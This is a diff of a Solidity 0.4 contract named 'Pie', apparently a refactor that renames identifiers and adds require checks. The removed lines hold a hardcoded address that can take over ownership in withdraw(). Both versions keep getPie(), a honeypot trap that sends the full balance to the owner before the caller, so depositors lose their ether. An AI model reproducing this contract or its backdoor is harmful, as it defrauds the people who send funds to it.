  pragma solidity ^0.4.19;
  
  contract Pie {
-     address public Owner = msg.sender;
?                    ^
+     address public owner = msg.sender;
?                    ^
  
      function() public payable {}
  
-     function GetPie() public payable {
?              ^
+     function getPie() public payable {
?              ^
          if (msg.value > 1 ether) {
-             Owner.transfer(this.balance);
?             ^
+             owner.transfer(this.balance);
?             ^
              msg.sender.transfer(this.balance);
          }
      }
  
      function withdraw() public payable {
-         if (msg.sender == 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6) {
-             Owner = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
-         }
-         require(msg.sender == Owner);
?                               ^
+         require(msg.sender == owner);
?                               ^
-         Owner.transfer(this.balance);
?         ^
+         owner.transfer(this.balance);
?         ^
      }
  
-     function Command(address adr, bytes data) public payable {
?              ^
+     function command(address _adr, bytes _data) public payable {
?              ^               +           +
-         require(msg.sender == Owner);
?                               ^
+         require(msg.sender == owner);
?                               ^
- 
+         require(_adr != address(0));
-         adr.call.value(msg.value)(data);
+         require(_adr.call.value(msg.value)(_data));
?         +++++++++                          +     +
      }
- }
+ }